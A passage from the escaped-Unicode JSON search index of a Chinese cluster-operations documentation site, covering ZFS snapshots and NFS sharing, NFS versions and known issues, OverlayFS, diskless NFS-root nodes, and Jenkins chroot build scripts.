\u516c\u53f8\u8d2d\u4e70\u5b58\u50a8\u670d\u52a1\uff0c\u8fd9\u4e24\u79cd\u5b9e\u73b0\u7684\u5927\u90e8\u5206\u7528\u6cd5\u4e00\u81f4\uff0c\u4f46\u6709\u4e00\u4e9b\u7ec6\u5fae\u4e0d\u540c\uff08\u6bd4\u5982\u5c5e\u6027\u8bbe\u7f6e\uff09\u3002Oracle \u7ef4\u62a4\u7684 ZFS \u6587\u6863\u5f88\u9002\u5408\u5165\u95e8\uff0cOpenZFS \u7684\u6587\u6863\u9605\u8bfb\u96be\u5ea6\u8f83\u9ad8\u3002\u53ef\u4ee5\u6309\u7167 Oracle \u7684\u6587\u6863\u6765\u5b66\u4e60\uff0c\u4f46\u9047\u5230\u4e0d\u7528\u7684\u7528\u6cd5\u65f6\u5e94\u5f53\u67e5 OpenZFS \u6587\u6863\u3002</li> </ul> <p>\u81ea\u884c\u9605\u8bfb\u76f8\u5173\u6587\u6863\uff0c\u4e86\u89e3 zpool\u3001dataset\u3001scrub \u548c snapshot \u7684\u6982\u5ff5\u3002</p> <ul> <li>\u67e5\u8be2</li> </ul> <pre><code>zpool list/status\nzfs list\n</code></pre> <ul> <li>\u521b\u5efa\u548c\u5220\u9664</li> </ul> <pre><code>zpool create &lt;zpool name&gt; &lt;raid type&gt; &lt;disks...&gt;\nzfs create -o mountpoint=/data ocean/data\n</code></pre> <p>The recommended way is to choose something from /dev/disk/by-id/ Some of these may include a UUID and others, the device serial number and (for partitions) the partition number.</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u538b\u7f29\u548c\u53bb\u91cd","title":"\u538b\u7f29\u548c\u53bb\u91cd","text":"<p>TODO</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u5feb\u7167","title":"\u5feb\u7167","text":"<p>Quote</p> <ul> <li>Overview of ZFS Snapshots - Oracle</li> </ul> <p>ZFS \u4e2d\u7684\u5feb\u7167\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u53ea\u8bfb\u526f\u672c\u3002</p> <p>\u8981\u521b\u5efa\u5feb\u7167\uff0c\u4f7f\u7528 <code>zfs snapshot</code> \u547d\u4ee4\uff0c\u53c2\u6570\u4e3a <code>ZFS \u6570\u636e\u96c6\u540d@\u5feb\u7167\u540d</code>\u3002\u4f7f\u7528 <code>-r</code> \u9009\u9879\u53ef\u4ee5\u9012\u5f52\u521b\u5efa\u5feb\u7167\u3002</p> <pre><code>zfs snapshot ocean/data@snap1\nzfs snapshot -r ocean/data@snap2\n</code></pre> <p>\u5217\u51fa\u5feb\u7167\u548c\u56de\u6eda\u64cd\u4f5c\uff1a</p> <pre><code>zfs list -t snapshot\nzfs rollback ocean/data@snap1\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7 ZFS \u6570\u636e\u96c6\u4e0b\u7684 <code>.zfs/snapshot</code> \u76ee\u5f55\u8bbf\u95ee\u5feb\u7167\uff1a</p> <pre><code>$ ls /ocean/data/.zfs/snapshot\nsnap1 snap2\n</code></pre> <p>Example</p> <p>\u76ee\u524d\u96c6\u7fa4\u7684\u5bb6\u76ee\u5f55\u8bbe\u7f6e\u4e86\u6bcf\u65e5\u5feb\u7167\u3002\u5982\u679c\u8bef\u5220\u6587\u4ef6\uff0c\u53ef\u4ee5\u5230 <code>storage</code> \u4e0a\u8fdb\u5165 <code>/home/.zfs/snapshot</code> \u76ee\u5f55\u627e\u56de\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#zfs-\u4e0e-nfs","title":"ZFS \u4e0e NFS","text":"<p>\u5173\u4e8e <code>sharenfs</code></p> <p></p> <p>\u955c\u50cf\u7ad9\u8054\u76df\u7fa4\u91cc\u7684\u8ba8\u8bba\u8bf4\u4e0d\u5efa\u8bae\u4f7f\u7528 <code>sharenfs</code>\uff0c\u529f\u80fd\u6bd4 <code>exports</code> \u5f31\u3002</p> <p>\u901a\u5e38 ZFS \u7528\u5982\u4e0b\u547d\u4ee4\u8bbe\u7f6e NFS \u670d\u52a1\uff1a</p> <pre><code>zfs get -r sharenfs\nzfs set xattr=sa dnodesize=auto ocean/data\nzfs set sharenfs=\"rw=172.25.0.0/16,no_root_squash,no_all_squash,nohide\" ocean/data\nshowmount -e 127.0.0.1\n</code></pre> <ul> <li>\u7b2c\u4e8c\u884c\u8bbe\u7f6e ZFS \u53c2\u6570 <code>xattr=sa</code> \u548c <code>dnodesize=auto</code>\u3002\u524d\u8005\u5c06\u6269\u5c55\u5c5e\u6027\u5b58\u50a8\u5728 inode \u800c\u4e0d\u662f\u9690\u85cf\u7684\u5b50\u6587\u4ef6\u5939\u4e2d\uff0c\u907f\u514d\u591a\u6b21 I/O \u64cd\u4f5c\uff1b\u540e\u8005\u6839\u636e\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u5143\u6570\u636e\u6216\u6269\u5c55\u5c5e\u6027\u591a\u5c11\u81ea\u52a8\u8c03\u6574 dnode \u5927\u5c0f\uff0c\u4e5f\u80fd\u591f\u51cf\u5c11 I/O \u64cd\u4f5c\u3002\u8bbe\u7f6e\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ef\u4ee5\u63d0\u9ad8 ZFS \u7684 NFS \u6027\u80fd\u8868\u73b0\u3002</li> <li>\u7b2c\u4e09\u884c\u8bbe\u7f6e NFS \u53c2\u6570 <code>no_root_squash</code>\u3001<code>no_all_squash</code> \u786e\u4fdd\u7528\u6237\u6743\u9650\u6b63\u786e\u3002</li> </ul> <p>\u5728\u65b0\u7cfb\u7edf\u4e0a\u521d\u6b21\u8bbe\u7f6e ZFS \u7684 <code>sharenfs</code> \u65f6\u53ef\u80fd\u9047\u5230\u9519\u8bef\uff1a</p> <pre><code>cannot share 'ocean: system error': NFS share creation failed\n</code></pre> <p>\u5927\u6982\u7387\u662f\u7f3a\u5c11 NFS server \u5de5\u5177\u3002\u53c2\u8003 Unintuitive error message setting sharenfs=on \u00b7 Issue #4534 \u00b7 openzfs/zfs\u3002</p> <p>\u4e00\u4e9b\u5df2\u77e5\u7684\u95ee\u9898</p> <p>\u5f53\u5ba2\u6237\u7aef\u4e3a NFSv3 \u65f6\uff0c\u670d\u52a1\u7aef\u9700\u8981\u8bbe\u7f6e <code>nohide</code>\uff0c\u5426\u5219\u5b50 dataset \u4e0d\u4f1a\u663e\u793a\u3002v4 \u4e0d\u9700\u8981\u663e\u5f0f\u8bbe\u7f6e\uff0c\u4e0d\u77e5\u9053\u662f feature \u8fd8\u662f bug\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#nfs","title":"NFS","text":"<p>Quote</p> <ul> <li>NFS best practice and implementation guide - NetAPP</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#nfs-\u53d1\u5c55\u60c5\u51b5","title":"NFS \u53d1\u5c55\u60c5\u51b5","text":"<p>Quote</p> <ul> <li>Advances in NFS \u2013 NFSv4.1 and pNFS - SNIA\uff1a\u4ecb\u7ecd\u4e86 NFSv4\u3001v4.1\u3001v4.2 \u7684\u65b0\u7279\u6027\u3002</li> <li>(2017)Linux Support of NFS v4.1 and v4.2 - Linux Foundation\uff1a\u4ecb\u7ecd\u4e86 Linux \u5bf9 NFSv4.1 \u548c v4.2 \u7684\u652f\u6301\u60c5\u51b5\u3002</li> </ul> \u7248\u672c \u65f6\u95f4 RFC NFSv2 1983 RFC 1094 - NFS: Network File System Protocol Specification NFSv3 1995 RFC 1813 - NFS Version 3 Protocol Specification NFSv4 2003 RFC 3530 - Network File System (NFS) version 4 Protocol NFSv4.1 2010 RFC 5661 - Network File System (NFS) Version 4 Minor Version 1 Protocol NFSv4.2 2016 RFC 7862 - Network File System (NFS) Version 4 Minor Version 2 Protocol <p>NFSv4 \u76f8\u6bd4 NFSv3 \u6709\u663e\u8457\u7684\u4e0d\u540c\uff0cNFSv4.1 \u4e0e NFSv4 \u53c8\u6709\u663e\u8457\u7684\u4e0d\u540c\u3002\u5982 NFSv4.1 \u6458\u8981\u4e2d\u6240\u8ff0\uff0c\u4e24\u8005\u88ab\u8ba4\u4e3a\u662f\u5404\u81ea\u72ec\u7acb\u7684\u534f\u8bae\uff1a</p> <p>NFS version 4 minor version 1 has no dependencies on NFS version 4 minor version 0, and it is considered a separate protocol.</p> <p>\u4e5f\u6b63\u662f\u56e0\u4e3a\u4e0a\u8ff0\u539f\u56e0\uff0cNFSv4.1 \u662f\u4e00\u4efd\u5b8c\u6574\u7684\u89c4\u8303\uff0c\u800c\u4e0d\u662f NFSv4 \u7684\u8865\u5145\u3002\u9605\u8bfb NFSv4.1 \u65f6\u4e0d\u9700\u8981\u9605\u8bfb NFSv4\u3002\u800c NFSv4.2 \u5219\u662f NFSv4.1 \u7684\u8865\u5145\uff0c\u9605\u8bfb\u65f6\u9700\u8981\u53c2\u8003 NFSv4.1\u3002</p> <p>\u6700\u65b0\u7684\u6807\u51c6\u603b\u662f\u4f1a\u88ab\u8fc5\u901f\u5b9e\u73b0\u548c\u666e\u53ca\uff0c\u5982\u679c\u60f3\u5b66\u4e60\u6807\u51c6\u4e5f\u6700\u597d\u4ece\u6700\u65b0\u7248\u672c\u5f00\u59cb\u3002</p> <p>\u5bf9\u4e8e Linux\uff0clinux-nfs \u8d1f\u8d23 NFS \u7684\u5f00\u53d1\u548c\u7ef4\u62a4\u3002NFSv4.2 \u5df2\u7ecf\u5728 Linux \u5f97\u5230\u652f\u6301\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#nfsv4","title":"NFSv4","text":"<p>Quote</p> <ul> <li>(2015)RFC 7530 Network File System (NFS) Version 4 Protocol - IETF Datatracker</li> <li>(2023)NFSv3 and NFSv4: What's the difference? - NetAPP</li> </ul> <p>NFS v4 \u7684 RFC \u5728 2003 \u5e74\u53d1\u5e03\u4e86\u4e00\u7248\uff08RFC 3530\uff09\uff0c\u5728 2015 \u5e74\u53c8\u53d1\u5e03\u4e86\u4e00\u7248\uff08RFC 7530\uff09\uff0c\u8fd9\u4e24\u7248\u7684\u5b9e\u73b0\u8fd8\u6709\u4e00\u4e9b\u4e0d\u540c\uff0c\u53ef\u80fd\u9700\u8981\u6ce8\u610f\u3002\u6bd4\u5982\uff1a<code>nfs4_setfacl</code> \u5c31\u4ecd\u7136\u91c7\u7528 RFC 3530\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#windows-server-\u4e0a\u7684-nfs","title":"Windows Server \u4e0a\u7684 NFS","text":"<p>Quote</p> <ul> <li>Network File System overview - Learn Microsoft</li> </ul> <p>Windows Server \u76ee\u524d\u4ec5\u80fd\u4f5c\u4e3a NFS v4.1 \u670d\u52a1\u5668\uff0c\u5ba2\u6237\u7aef\u53ea\u652f\u6301\u5230 NFS v3\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#nfsv4-over-rdma","title":"NFSv4 over RDMA","text":"<p>NFS over IPoIB / NFS over RDMA - CMU \u5bf9 NFS over RDMA \u505a\u4e86\u5f88\u597d\u7684\u5bf9\u6bd4\u7814\u7a76\u3002\u76ee\u524d\uff0c\u6211\u4eec\u5728\u4f7f\u7528 NFS over RDMA \u65f6\u9047\u5230\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u8fd8\u6ca1\u6709\u89e3\u51b3\uff1a</p> <ul> <li>\u6211\u4eec\u7684\u96c6\u7fa4\u4ece NFS Root \u542f\u52a8\uff0c\u901a\u8fc7 NFSv4 over Ethernet \u6302\u8f7d\u4e86\u6839\u6587\u4ef6\u7cfb\u7edf\u3002</li> <li>\u542f\u52a8\u540e\uff0c\u8bd5\u56fe\u4f7f\u7528 NFSv4 over RDMA \u4ece\u76f8\u540c\u670d\u52a1\u5668\u4e0a\u6302\u8f7d\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\uff0c\u4f46\u53d1\u73b0\u6d41\u91cf\u5e76\u6ca1\u6709\u8d70 RDMA\uff0c\u5168\u8d70\u4ee5\u592a\u7f51\u4e86\u3002</li> </ul> <p>\u4e0b\u9762\u662f\u6211\u4eec\u7684\u4e00\u4e9b\u5c1d\u8bd5\u548c\u731c\u6d4b\uff1a</p> <ul> <li>\u53ef\u80fd\u662f NFSv4 Session \u673a\u5236\u7684\u539f\u56e0\u3002\u76ee\u524d\u6ca1\u6709\u5f04\u6e05\u695a\u5177\u4f53\u673a\u5236\uff0c\u4f46 NFSv4 Session \u662f\u80fd\u63d0\u4f9b\u591a\u8def\u590d\u7528\u7684\uff0c\u5e94\u8be5\u4f1a\u66f4\u5feb\u624d\u5bf9\u3002</li> <li>\u4f7f\u7528 NFSv3 \u53ef\u4ee5\u6302\u8f7d RDMA\u3002\u4f46\u662f\u6211\u4eec\u770b\u5230 NFSv3 \u8d70\u7684\u662f IPoIB\uff0cRDMA \u8868\u73b0\u4f1a\u6bd4 IPoIB \u597d\u4e00\u4e9b\u3002\u800c\u4e14 NFSv4 \u5e26\u6765\u4e86\u5f88\u591a\u91cd\u8981\u6539\u53d8\uff0c\u6211\u4eec\u66f4\u504f\u5411\u4e8e\u4f7f\u7528 NFSv4\u3002</li> </ul> <p>\u6211\u4eec\u9700\u8981\u5bf9 Linux NFS \u7684\u5b9e\u73b0\u7ec6\u8282\u6709\u66f4\u6df1\u5165\u7684\u4e86\u89e3\uff0c\u5c1d\u8bd5\u89e3\u51b3\u901a\u8fc7\u591a\u4e2a\u8def\u5f84\u4ece\u540c\u4e00\u4e2a NFS \u670d\u52a1\u5668\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u7684\u95ee\u9898\u3002</p> <p>\u6b64\u5916\uff0c\u6216\u8bb8\u53ef\u4ee5\u8003\u8651 FlexBoot\uff0c\u76f4\u63a5\u5728\u542f\u52a8\u65f6\u5c06\u6839\u6587\u4ef6\u7cfb\u7edf\u6302\u8f7d\u5230 IB \u4e0a\u3002\u4f46\u662f FlexBoot \u6bd5\u7adf\u662f NVIDIA \u95ed\u6e90\u6807\u51c6\uff0c\u5fc5\u987b\u6709 IB \u5361\u624d\u80fd\u4f7f\u7528\u3002\u56e0\u6b64\u6211\u4eec\u653e\u5f03\u4e86\u8003\u8651\u8be5\u79cd\u529e\u6cd5\u3002</p> <p>https://www.kernel.org/doc/Documentation/filesystems/nfs/nfs-rdma.txt</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#nfs-\u95ee\u9898\u8bb0\u5f55","title":"NFS \u95ee\u9898\u8bb0\u5f55","text":"<ul> <li>What are .nfsXXXX files and how do I delete them? - NetApp Knowledge Base</li> </ul> <p>\u62a5\u9519\u4f8b\uff1a</p> <pre><code>$ rm -rf oscar-corpus\nrm: cannot remove 'oscar-corpus/oscar/train/.nfs000000000000395800000018': Device or resource busy\n</code></pre> <p>\u539f\u56e0\uff1aFiles with a naming convention like <code>.nfsXXXX</code> are created by NFS clients when a file that is currently opened on a client is deleted by that client. The client renames the file to <code>.nfsXXXX</code> which discourages other clients/processes from utilizing the file. The client that does the rename should delete the file once it's been closed by the client process. This delete might not occur if the client is dsiconnected, rebooted,  or the process that would issue the delete is terminated.</p> <ul> <li>NFS \u4e22\u5931\u6587\u4ef6\u6269\u5c55\u5c5e\u6027</li> </ul> <p>\u62a5\u9519\u4f8b\uff1a</p> <pre><code>$ ping baidu.com\nping: socktype: SOCK_RAW\nping: socket: Operation not permitted\nping: =&gt; missing cap_net_raw+p capability or setuid?\n$ sudo getcap /usr/bin/ping\n</code></pre> <p>\u539f\u56e0\uff1a</p> <ul> <li>NFS 4.2 \u5f00\u59cb\u652f\u6301 xattr\uff08\u53c2\u8003 NFSv4.2 Extended attributes\uff09\u3002</li> <li>Linux 5.9 \u8d77\u5df2\u7ecf\u5b9e\u73b0\u4e86 NFS Server \u7684 xattr \u652f\u6301\uff08\u53c2\u8003 User Xattr Support Finally Landing For NFS In Linux 5.9 - Phoronix\uff09\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#overlayfs","title":"OverlayFS","text":"<p>Quote</p> <ul> <li>OverlayFS</li> </ul> <ul> <li>\u4e0a\u4e0b\u5c42\u540c\u540d\u76ee\u5f55\u5408\u5e76</li> <li>\u4e0a\u5c42\u6587\u4ef6\u8986\u76d6\u4e0b\u5c42</li> <li>\u4e0a\u5c42\u53ef\u5199</li> <li>\u4e0b\u5c42\u53ea\u8bfb\uff0c\u5199\u65f6\u590d\u5236\u5230\u4e0a\u5c42</li> </ul> <p>OverlayFS \u8fd0\u884c\u65f6\uff0c\u4e0d\u5e94\u5f53\u5bf9\u4e0b\u5c42\u6587\u4ef6\u7cfb\u7edf\u8fdb\u884c\u64cd\u4f5c\uff0c\u5426\u5219\u4f1a\u5bfc\u81f4\u4e0d\u53ef\u9884\u77e5\u7684\u7ed3\u679c\u3002\u56e0\u6b64\uff0c\u5728\u5f53\u524d OverlayNFSRoot \u7684\u96c6\u7fa4\u4e0a\uff0c\u5982\u679c\u9700\u8981\u5bf9\u6839\u6587\u4ef6\u7cfb\u7edf\u8fdb\u884c\u64cd\u4f5c\uff0c\u5e94\u5f53\u5148\u5173\u95ed\u6240\u6709\u542f\u52a8\u5230 OverlayFS \u7684\u8282\u70b9\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u6587\u4ef6\u7cfb\u7edf\u5b9e\u8df5","title":"\u6587\u4ef6\u7cfb\u7edf\u5b9e\u8df5","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#fsck","title":"<code>fsck</code>","text":"<p><code>fsck</code> \u662f <code>util-linux</code> \u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u68c0\u67e5\u548c\u4fee\u590d\u6587\u4ef6\u7cfb\u7edf\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/systemd/","title":"systemd","text":""},{"location":"operation/system/basic/systemd/#systemd","title":"systemd","text":""},{"location":"operation/system/basic/systemd/#systemd-\u7b80\u4ecb","title":"systemd \u7b80\u4ecb","text":""},{"location":"operation/system/basic/systemd/#systemd-\u670d\u52a1","title":"systemd \u670d\u52a1","text":"<p>Info</p> <ul> <li>https://www.digitalocean.com/community/tutorials/systemd-essentials-working-with-services-units-and-the-journal</li> <li>https://www.freedesktop.org/software/systemd/man/latest/systemd.special.html</li> <li>https://opensource.com/article/20/5/systemd-startup</li> <li>\u5165\u95e8\u63a8\u8350 systemd by example\uff1ahttps://seb.jambor.dev/posts/systemd-by-example-part-1-minimization/<ul> <li>\u8fd9\u4e2a\u8fd8\u63d0\u4f9b\u4e86\u914d\u5957\u7684 playground\uff0c\u4f60\u53ef\u4ee5\u4fee\u6539\u914d\u7f6e\u7136\u540e\u542f\u52a8\u7cfb\u7edf\u67e5\u770b\u8f93\u51fa\u548c journalctl\uff0c\u975e\u5e38\u9002\u5408\u5b66\u4e60\u3002</li> </ul> </li> </ul>"},{"location":"operation/system/basic/systemd/#systemd-\u4e0e\u542f\u52a8\u8fc7\u7a0b","title":"systemd \u4e0e\u542f\u52a8\u8fc7\u7a0b","text":"<pre><code>- [https://insujang.github.io/2018-11-22/systemd-boot-process/](https://insujang.github.io/2018-11-22/systemd-boot-process/)\n\n- [https://unix.stackexchange.com/questions/90723/is-there-any-reason-to-move-away-from-fstab-on-a-systemd-system](https://unix.stackexchange.com/questions/90723/is-there-any-reason-to-move-away-from-fstab-on-a-systemd-system)\n</code></pre>"},{"location":"operation/system/diskless/","title":"\u65e0\u76d8\u7cfb\u7edf","text":""},{"location":"operation/system/diskless/#\u65e0\u76d8\u7cfb\u7edf","title":"\u65e0\u76d8\u7cfb\u7edf","text":"<p>Abstract</p> <p>\u672c\u6587\u4ecb\u7ecd\u6211\u4eec\u9009\u62e9\u65e0\u76d8\u7cfb\u7edf\u7684\u539f\u56e0\u3002\u6280\u672f\u7ec6\u8282\u89c1\u5b50\u6587\u6863\u3002</p> <p>Quote</p> <ul> <li>Managing Cluster Software Packages - ADMIN Magazine</li> </ul> <p>\u6211\u4eec\u7684\u76ee\u6807\u662f\uff1a</p> <ul> <li>\u65b9\u4fbf\u5730\u7ba1\u7406\u51e0\u5341\u53f0\u8282\u70b9</li> <li>\u907f\u514d\u8282\u70b9\u95f4\u8f6f\u4ef6\u5305\u3001\u7528\u6237\u7b49\u73af\u5883\u4e0d\u4e00\u81f4\u9020\u6210\u95ee\u9898</li> </ul> <p>\u8fd9\u4e9b\u95ee\u9898\u6709\u5f88\u591a\u89e3\u51b3\u65b9\u6848\uff0c\u6bd4\u5982\u96c6\u7fa4\u7ba1\u7406\u6709 Ansible Playbook\uff0c\u8f6f\u4ef6\u5305\u6709\u4ee5\u4e0b\u89e3\u51b3\u65b9\u6848\uff1a</p> <ul> <li>Image Based \u2013 A node disk image is propagated out to nodes on boot. Different \u201crolls\u201d (images) can be constructed for different packages.</li> <li>NFS Root \u2013 Each node boots and installs everything as NFS root except for things that change for each node (e.g., /etc, /var). This system can be run disk-less or disk-full.</li> <li>RAM Disk \u2013 A RAM disk is created on each node that holds a running system image. The RAM disk system can be created in hybrid mode, wherein some files are available via NFS, and it can run disk-less or disk-full.</li> </ul> <p>\u7ecf\u8fc7\u67e5\u9605\u8d44\u6599\u548c\u6848\u4f8b\u8c03\u7814\uff0c\u6700\u540e\u51b3\u5b9a\u91c7\u7528 NFS Root \u7684\u65b9\u5f0f\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6709\u51e0\u4e2a\u975e\u5e38\u65b9\u4fbf\u7684\u7528\u6cd5\uff1a</p> <ul> <li>\u6211\u4eec\u53ea\u9700\u8981\u5728 NFS Root \u4e0a\u8fdb\u884c\u914d\u7f6e\u3001\u5347\u7ea7\u548c\u7ef4\u62a4\uff0c\u4e0d\u9700\u8981\u64cd\u4f5c\u6bcf\u53f0\u673a\u5668\u3002</li> <li>\u65b0\u673a\u5668\u63a5\u5165\u540e\uff0c\u4e0d\u9700\u8981\u624b\u52a8\u5b89\u88c5\u914d\u7f6e\uff0c\u76f4\u63a5\u62e5\u6709\u548c\u73b0\u6709\u8282\u70b9\u4e00\u81f4\u7684\u73af\u5883\u3002</li> <li>\u5916\u51fa\u6bd4\u8d5b\u65f6\uff0c\u9009\u53d6\u9700\u8981\u7684 NFS Root \u5199\u51e0\u4e2a\u4e00\u6837\u7684\u76d8\uff0c\u987a\u4fbf\u5199\u4e0a\u5f15\u5bfc\u4e5f\u53ef\u4ee5\u3002\u5230\u8d5b\u573a\uff0c\u7528\u5176\u4ed6\u4ecb\u8d28\u5f15\u5bfc\u542f\u52a8\uff0c\u83b7\u5f97\u6240\u6709\u73af\u5883\u4e00\u81f4\u7684\u8282\u70b9\uff0c\u4e0d\u7528\u518d\u4e00\u53f0\u53f0\u88c5\u7cfb\u7edf\u3002</li> </ul> <p>NFS Root \u4fdd\u8bc1\u4e86\u5404\u8282\u70b9\u7684\u7cfb\u7edf\u5185\u6838\u3001\u8f6f\u4ef6\u5305\uff08APT\uff09\u4e00\u81f4\u3002\u5728\u6b64\u4e4b\u4e0a\uff0c\u6211\u4eec\u5bf9\u6839\u6587\u4ef6\u7cfb\u7edf\u4f7f\u7528 OverlayFS\uff0c\u4f7f\u5f97\u8282\u70b9\u62e5\u6709\u5bf9\u6839\u6587\u4ef6\u7cfb\u7edf\u7684\u5b8c\u6574\u6743\u9650\uff0c\u540c\u65f6\u4e0d\u4f1a\u5f71\u54cd\u5230\u5176\u4ed6\u8282\u70b9\uff0c\u4e14\u7cfb\u7edf\u6613\u4e8e\u6062\u590d\u3002</p>"},{"location":"operation/system/diskless/cicd/","title":"\u81ea\u52a8\u6784\u5efa\uff1aJenkins","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u81ea\u52a8\u6784\u5efajenkins","title":"\u81ea\u52a8\u6784\u5efa\uff1aJenkins","text":"<p>Abstract</p> <p>\u5728 NFS Root \u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u4f7f\u7528 Jenkins \u8fdb\u884c\u65e0\u76d8\u7cfb\u7edf\u7684\u81ea\u52a8\u5316\u6784\u5efa\u3002</p> <p>Jenkins \u8fd0\u7ef4\u89c1 \u96c6\u7fa4\u670d\u52a1/Jenkins\uff0c\u672c\u6587\u4e0d\u518d\u8d58\u8ff0 Jenkins \u7684\u5b89\u88c5\u548c\u914d\u7f6e\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u4e3a\u4ec0\u4e48\u9700\u8981-cicd","title":"\u4e3a\u4ec0\u4e48\u9700\u8981 CI/CD\uff1f","text":"<p>\u5728\u4f7f\u7528 CI/CD \u524d\uff0c\u8fd0\u7ef4\u4eba\u5458\u624b\u52a8\u8fdb\u5165\u6839\u6587\u4ef6\u7cfb\u7edf\u8fdb\u884c\u64cd\u4f5c\uff0c\u6ca1\u6709\u5b8c\u5584\u7684\u8bb0\u5f55\u548c\u7248\u672c\u63a7\u5236\u3002\u968f\u7740\u65f6\u95f4\u79ef\u7d2f\uff0c\u8fd0\u7ef4\u4eba\u5458\u4e5f\u9010\u6e10\u9057\u5fd8\u64cd\u4f5c\u6d41\u7a0b\uff0c\u5404\u7c7b\u914d\u7f6e\u5f80\u5f80\u96be\u4ee5\u590d\u73b0\u548c\u8fc1\u79fb\u3002\u800c CI/CD \u53ef\u4ee5\uff1a</p> <ul> <li>\u8282\u7701\u4eba\u529b\u6210\u672c\uff1a\u53ea\u9700\u8981\u4fee\u6539\u811a\u672c\uff0c\u7531 CI/CD \u81ea\u52a8\u68c0\u6d4b\u3001\u6784\u5efa\u3001\u6d4b\u8bd5\u3001\u90e8\u7f72\u3002</li> <li>\u5b8c\u5584\u7684\u8bb0\u5f55\u548c\u7248\u672c\u63a7\u5236\uff0c\u7ed3\u679c\u53ef\u590d\u73b0\u3002</li> <li>\u65b9\u4fbf\u8fc1\u79fb\u548c\u5347\u7ea7\uff1aCI/CD \u5e73\u53f0\u53ef\u4ee5\u5728\u5404\u79cd\u73af\u5883\u4e2d\u90e8\u7f72\u3002</li> </ul> <p>CI/CD \u914d\u7f6e\u6587\u4ef6\u89c1  zjusct/ops/conf-diskless\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/diskless/cicd/#\u6e90\u7801\u5206\u6790jenkinsdebiannet","title":"\u6e90\u7801\u5206\u6790\uff1a<code>jenkins.debian.net</code>","text":"<p>Debian \u7684\u8d28\u91cf\u7ba1\u7406\uff08Quality Assurance, QA\uff09\u56e2\u961f\u4f7f\u7528 Jenkins \u5728 <code>jenkins.debian.net</code> \u4e0a\u8fdb\u884c\u7cfb\u7edf\u6784\u5efa\u6d4b\u8bd5\uff0c\u5176\u4e2d\u5305\u62ec\u57fa\u4e8e <code>chroot</code> \u7684\u6d4b\u8bd5\u3002\u76f8\u5173\u914d\u7f6e\u6587\u4ef6\u89c1  qa/jenkins.debian.net\u3002</p> <p>\u6838\u5fc3\u6587\u4ef6\u4e3a <code>bin/chroot-installation.sh</code>\u3002</p> <p>\u5f00\u5934\u7684 <code>common-init</code> \u975e\u5e38\u6709\u610f\u601d\uff1a\u5c06\u811a\u672c\u81ea\u8eab\u62f7\u8d1d\u4e3a\u4e00\u4e2a\u4e34\u65f6\u6587\u4ef6\u7136\u540e\u6267\u884c\u3002\u8fd9\u6837\u505a\u5728\u751f\u4ea7\u73af\u5883\u4e2d\u53ef\u4ee5\u907f\u514d\u811a\u672c\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u4fee\u6539\u5bfc\u81f4\u5931\u8d25\u3002</p> common-functions.sh<pre><code>common_init(){\n#...\nif [ \"${0:0:5}\" != \"/tmp/\" ] ; then\n#...\n    # mktemp some place for us...\n    TTT=\"$(mktemp --tmpdir=/tmp jenkins-script-XXXXXXXX)\"\n    if [ -z \"$TTT\" ] ; then\n        echo \"Failed to create tmpfile, aborting. (Probably due to read-only filesystem\u2026)\"\n        exit 1\n    fi\n    # prepare cleanup\n    trap common_cleanup INT TERM EXIT\n    # cp $0 to /tmp and run it from there\n    cp $0 $TTT\n    chmod +x $TTT\n#...\nfi\n</code></pre> <p>\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u505a <code>chroot</code> \u524d\u7684\u51c6\u5907\uff1a</p> chroot-installation.sh<pre><code>bootstrap() {\n    echo \"Bootstraping $1 into $CHROOT_TARGET now.\"\n    set -x\n    sudo mmdebstrap $1 $CHROOT_TARGET $MIRROR\n    set +x\n    prepare_bootstrap $1\n    execute_ctmpfile\n}\n</code></pre> <p>mmdebstrap: In contrast to debootstrap it uses apt to resolve dependencies and is thus able to use more than one mirror and resolve more complex dependency relationships.</p> <p><code>prepare_bootstrap</code> \u5c06\u4e00\u4e9b\u914d\u7f6e\u5199\u5165 <code>chroot</code> \u540e\u4f7f\u7528\u7684\u4e34\u65f6\u6587\u4ef6\uff1a</p> chroot-installation.sh<pre><code>prepare_bootstrap() {\n    # \u5c06 EOF \u4e2d\u7684\u5185\u5bb9\u5199\u5165\u5230 $CTMPFILE \u4e34\u65f6\u6587\u4ef6\uff0c\u7528\u4e8e\u7cfb\u7edf\u914d\u7f6e\u521d\u59cb\u5316\n    cat &gt;&gt; $CTMPFILE &lt;&lt;-EOF\n    # \u52a0\u5165\u811a\u672c\u5934\u90e8\u5185\u5bb9\uff08\u5373 #!/bin/bash\uff09\n    $SCRIPT_HEADER\n    set -x\n    # \u6302\u8f7d /proc 